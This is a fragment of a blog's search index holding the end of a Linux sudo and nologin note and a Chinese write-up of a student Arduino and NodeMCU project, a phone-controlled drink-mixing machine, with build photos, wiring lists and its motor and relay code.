class="line">/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>以上是有關配置sudo權限和更改帳戶shell的一些技巧。<br>透過這些設定，我們可以更好地管理Linux系統上的使用者權限和安全性。</p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019通訊系畢業專題</title>
      <link href="/posts/4b76a41f.html"/>
      <url>/posts/4b76a41f.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/O3Xs5VC.jpg"></p><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>老實說一開始選擇教授時，並沒有想太多，只想找涼的教授，我記得當時的考量是 「對我們學校來說還是考研趕快換學校重要」因此沒有挑戰硬一點的主題&#x2F;教授 XD。所以最後我找了全系最涼的教授，專題主題每年都只定Arduino(原因應該是省錢又省時，也不太需要教)，6個專題生分成3組，每組2人。</p><p><strong>「Arduino + APP 遠端遙控」</strong>，其他主題包裝自己想。<br>既然技術簡單、架構清楚，看來要比的是創意和想法了~~~。在某一天的午後，我和組員要去買飲料，突然靈機一動，要是市面上手搖杯和飲料都能自動調配和無線操控，應該蠻不錯的喔！！！<br>因此我們的專題 「Smart Drinks 智慧飲料機」誕生了。</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>我們將想達成的目標簡單分成幾個 part，來一一解決<br>APP + Wifi連接 + 移動飲料的方法 + 飲料機身<br>由於移動、調配飲料的方法是關鍵，會影響到整題機身設計<br>所以我們先設計調飲料方法(怎麼做，怎麼設計)。</p><h3 id="取料、調配方法"><a href="#取料、調配方法" class="headerlink" title="取料、調配方法:"></a>取料、調配方法:</h3><p>我們打算透過一個容器來裝載飲料原料，讓容器底部開孔，而底部之下黏一個紙板，紙板也開孔，但容器孔和紙板孔先不對齊，由servo motor來控制旋轉角度，進而使紙板孔和容器孔對齊，內容物則會自然落下。</p><p><img src="https://i.imgur.com/BdtsD1G.jpg"></p><p>所以這種取料方式，容器必須有一定高度，因此機身設計必須考慮這點。那可想而知，飲料杯必須在底部移動，進行取料，最後還要加水。</p><h3 id="移動方式："><a href="#移動方式：" class="headerlink" title="移動方式："></a>移動方式：</h3><p>設計 X、Y軸滑台(類似夾娃娃機上方的移動橫桿)，來讓飲料杯進行前後，左右的移動。<br>在大致規劃好要怎麼取料移動後，著手進行機身的設計</p><h3 id="機身設計："><a href="#機身設計：" class="headerlink" title="機身設計："></a>機身設計：</h3><p>透過便宜又環保的松木層板來進行裁切和組裝</p><p><img src="https://i.imgur.com/7CoF2dM.jpg"></p><p>由於沒有過木工經驗，耗費許久時間在木工上(木工已加入工具人skill set內)XD。 接著實作上方的取料罐和伺服馬達：</p><ul><li>取料罐：隨便一個罐子(有蓋)，將底部開洞，紅色蓋子處也開洞(洞口可自行設計形狀)</li></ul><p><img src="https://i.imgur.com/gWqliC7.jpg"></p><p>接著將紙板或珍珠板開略大於紅色蓋子孔的扇形洞，並透過小螺絲穿過紙板和容器板(以方便轉動)</p><ul><li>伺服馬達: 固定於上層層版側面，並與紙板相黏</li></ul><p><img src="https://i.imgur.com/Xze3y4W.jpg"></p><p>為了防止servo motor轉動時容器跟著轉動，用熱溶膠固定鐵絲和取料罐在層板上</p><p><img src="https://i.imgur.com/RGGwRKY.jpg"></p><p>這樣取料罐架構基本上就完成了，接著就重複3次，因為我們設了3個取料罐<br>開始實作最麻煩的X、Y軸滑台：<br>材料：步進馬達 x 2、螺旋軸 x 2(或直接去網購 絲軸)、軸承座 x 4、束帶、培林 x2、鐵桿 x 2<br>裁好合適的木頭並鑽孔放入鐵桿和 螺旋軸+ 步進馬達(*放入螺旋軸前須放入培林，避免螺旋軸轉動時將木板轉出來)，最後放入軸承座來乘載X軸，x軸做法同上。</p><iframe width="820" height="500" src="https://www.youtube.com/embed/atkGcfnsK3A" title="How to Make Homework Writing Machine at home" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe><p>我們碰到最大的問題是：X軸太重，難以支撐，因此整個軸承座會卡住，南以轉動，後臨時透過小型玩具車來支撐解決這個問題</p><p><img src="https://i.imgur.com/gPWebQS.jpg"></p><blockquote><p>這樣飲料機身部分也完成了！！</p></blockquote><h3 id="硬體接線部分："><a href="#硬體接線部分：" class="headerlink" title="硬體接線部分："></a>硬體接線部分：</h3><p><img src="https://i.imgur.com/KmXl0AO.png"></p><p>所用元件： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- NodeMCU</span><br><span class="line">- Arduino Mega板</span><br><span class="line">- L298N x 2</span><br><span class="line">- 4-channel relay</span><br><span class="line">- 1-channel relay</span><br><span class="line">- servo x4</span><br><span class="line">- stepper motor x2</span><br><span class="line">- 沉水馬達 x2</span><br><span class="line">- power supply(可改用多個電池盒)</span><br></pre></td></tr></table></figure><p>想法：透過NodMCU接收指令來操控4個繼電器開關，每個繼電器又分別接到Arduino板電源，每個Arduino板對應一種飲料，預先燒好的code在Arduino內，電源開啟時則會自動執行取料和飲料調配程式。</p><p>ps. 上圖有只有實作一個Arduino板<br>ps.每個Arduino板必須在連到一個控制沉水馬達的繼電器上</p><p><img src="https://i.imgur.com/u38OXhA.jpg"></p><p>水管的位置會是飲料放置的起始點和終點(取原料回原位加水)</p><p><img src="https://i.imgur.com/hJ1RbRy.jpg"></p><p>NodeMCU 接線:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- 4路繼電器</span><br><span class="line">- 分別接到4個Arduino電源孔</span><br><span class="line">- 4個Arduino 板分別將L298N 控制接腳接出來，分別控制滑台XY軸</span><br><span class="line">- 4個Arduino 其他pin 腳接出來控制4個 servo motor</span><br><span class="line">- 4個Arduino 某pin腳出來 接出來到沉水馬達訊號線。</span><br></pre></td></tr></table></figure><blockquote><p>注意電壓分配</p></blockquote><p>Arduino程式部分:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Arduino程式部分：</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Stepper.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Servo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STEPS 200 <span class="comment">//定義步進馬達每圈的步數</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WATER 24 <span class="comment">//抽水馬達腳位</span></span></span><br><span class="line"><span class="comment">//steps:代表馬達轉完一圈需要多少步數。如果馬達上有標示每步的度數，</span></span><br><span class="line"><span class="comment">//將360除以這個角度，就可以得到所需要的步數(例如：360/3.6=100)。</span></span><br><span class="line">Stepper <span class="title function_">Y</span><span class="params">(STEPS, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>)</span>;</span><br><span class="line">Stepper <span class="title function_">X</span><span class="params">(STEPS, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>)</span>;</span><br><span class="line">Servo goal;</span><br><span class="line"><span class="type">int</span> pos;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> goal.attach(<span class="number">12</span>);</span><br><span class="line"> goal.write(<span class="number">0</span>);</span><br><span class="line"> X.setSpeed(<span class="number">160</span>); <span class="comment">// 將馬達的速度設定成140RPM 最大 150~160</span></span><br><span class="line"> Y.setSpeed(<span class="number">160</span>); <span class="comment">// 電壓7.5V</span></span><br><span class="line"> pinMode(WATER,OUTPUT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// Y.step(17000);//+向內 - 向外 //可可:17000 //奶茶: 17000 //茶:無</span></span><br><span class="line"> delay(<span class="number">500</span>);</span><br><span class="line"> X.step(<span class="number">-24000</span>);<span class="comment">//向內 //可可:-7500 //奶茶:-20000 //茶: -20000</span></span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> <span class="keyword">for</span> (pos = <span class="number">0</span>; pos &lt;= <span class="number">120</span>; pos += <span class="number">1</span>) &#123; <span class="comment">//可可:140 //奶茶: 40 //茶:120</span></span><br><span class="line"> goal.write(pos); </span><br><span class="line"> delay(<span class="number">15</span>); </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> (pos = <span class="number">120</span>; pos &gt;= <span class="number">0</span>; pos -= <span class="number">1</span>) &#123; </span><br><span class="line"> goal.write(pos); </span><br><span class="line"> delay(<span class="number">15</span>); </span><br><span class="line"> &#125;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> X.step(<span class="number">22000</span>); </span><br><span class="line"> <span class="comment">// delay(500);</span></span><br><span class="line"> <span class="comment">// Y.step(-17000);</span></span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(WATER, HIGH);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> digitalWrite(WATER, LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"><span class="comment">//while(1) &#123; &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想要取後排的飲料，就必須，先移動Y軸到後排再移動X軸到定點，接著servo motor轉動取料，再移動X軸至原位，Y軸移至起始位置加水，最後啟動抽水馬達則完畢。</p><blockquote><p>程式必須根據容器擺放位置，和原料出料時間，抽水量多寡來調整delay時間，且前排不需要移動Y軸。</p></blockquote><p>NodeMCU 程式碼:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY1 D7 <span class="comment">//CHOOCLATE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY2 D8 <span class="comment">// COFFEE</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RELAY3 D5 <span class="comment">// Tea</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ESP8266WiFi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WiFiClient.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ESP8266WebServer.h&gt;</span></span></span><br><span class="line">String command; <span class="comment">//String to store app command state.</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* ssid = <span class="string">&quot;專題&quot;</span>;</span><br><span class="line">ESP8266WebServer <span class="title function_">server</span><span class="params">(<span class="number">80</span>)</span>;</span><br><span class="line"><span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">pinMode(RELAY1, OUTPUT);</span><br><span class="line"> pinMode(RELAY2, OUTPUT);</span><br><span class="line"> pinMode(RELAY3, OUTPUT);</span><br><span class="line">Serial.begin(<span class="number">115200</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Connecting WiFi</span></span><br><span class="line">WiFi.mode(WIFI_AP);</span><br><span class="line"> WiFi.softAP(ssid);</span><br><span class="line">IPAddress myIP = WiFi.softAPIP();</span><br><span class="line"> Serial.print(<span class="string">&quot;AP IP address: &quot;</span>);</span><br><span class="line"> Serial.println(myIP);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// Starting WEB-server </span></span><br><span class="line"> server.on ( <span class="string">&quot;/&quot;</span>, HTTP_handleRoot );</span><br><span class="line"> server.onNotFound ( HTTP_handleRoot );</span><br><span class="line"> server.begin(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//巧克力</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay1</span><span class="params">()</span>&#123;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(RELAY1,HIGH);</span><br><span class="line"> delay(<span class="number">180000</span>);</span><br><span class="line"> digitalWrite(RELAY1,LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//奶茶或咖啡</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay2</span><span class="params">()</span>&#123;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(RELAY2,HIGH);</span><br><span class="line"> delay(<span class="number">180000</span>);</span><br><span class="line"> digitalWrite(RELAY2,LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//茶</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">relay3</span><span class="params">()</span>&#123;</span><br><span class="line"> delay(<span class="number">1000</span>);</span><br><span class="line"> digitalWrite(RELAY3,HIGH);</span><br><span class="line"> delay(<span class="number">145000</span>);</span><br><span class="line"> digitalWrite(RELAY3,LOW);</span><br><span class="line"> delay(<span class="number">5000</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line"> server.handleClient();</span><br><span class="line"> </span><br><span class="line"> command = server.arg(<span class="string">&quot;State&quot;</span>); <span class="comment">//只有手機改變state，下面command才會變</span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (command == <span class="string">&quot;L&quot;</span>) &#123;</span><br><span class="line"> relay1(); <span class="comment">/*chocoltae*/</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;R&quot;</span>) &#123;</span><br><span class="line"> relay2(); <span class="comment">/*milk tea */</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;I&quot;</span>)&#123;</span><br><span class="line"> relay3(); <span class="comment">/*tea*/</span> </span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (command == <span class="string">&quot;F&quot;</span>)&#123;</span><br><span class="line"> counter ++;</span><br><span class="line"> Serial.println(counter);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HTTP_handleRoot</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="keyword">if</span>( server.hasArg(<span class="string">&quot;State&quot;</span>) )&#123;</span><br><span class="line"> Serial.println(server.arg(<span class="string">&quot;State&quot;</span>));</span><br><span class="line"> &#125;</span><br><span class="line"> server.send ( <span class="number">200</span>, <span class="string">&quot;text/html&quot;</span>, <span class="string">&quot;&quot;</span> );</span><br><span class="line"> delay(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手機端</p><blockquote><p>當時不會寫手機App :(，因此用簡單的MIT AppInventor 來製作</p></blockquote><p><img src="https://i.imgur.com/3QvP8RH.png"><br><img src="https://i.imgur.com/qefwDHP.png"><br><img src="https://i.imgur.com/sZfOMW0.png"></p><h2 id="實際操作"><a href="#實際操作" class="headerlink" title="實際操作"></a>實際操作</h2><ol><li>容器填料</li><li>裝水容器加水</li><li>power supply on</li><li>手機連到Wifi AP</li><li>開啟 APP選擇想喝的飲料</li><li>等待機器完成</li></ol><p><em>整體圖</em><br><img src="https://i.imgur.com/UOlH6Vp.jpg"></p><p><em>還有LED跑馬燈</em><br><img src="https://i.imgur.com/a51d2x3.jpg"></p><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>此專題有很多可以改進的地方，不論是器材的選購以及馬達的穩定度<br>雖然Arduino真的很簡單，但只要點子夠多還是發展無窮。</p><h2 id="未來發展"><a href="#未來發展" class="headerlink" title="未來發展"></a>未來發展</h2><ul><li>上方原料罐可設計成可拆卸式</li><li>可以設計攪拌模組(直流馬達配冰棒棍之類的XD)</li><li>防水設計</li><li>APP 改用 Android Studio 設計，比較多彈性</li><li>直接選購結合 ESP8266和繼電器的模組(後來才知道有這東西)</li><li>語音辨識，不用APP</li><li>加熱器：可同時冷、熱水沖泡</li></ul>]]></content>
      
      
      <categories>
          
          <category> 實作紀錄 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arduino </tag>
            
            <tag> IOT </tag>
            
            <tag> NodeMCU </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
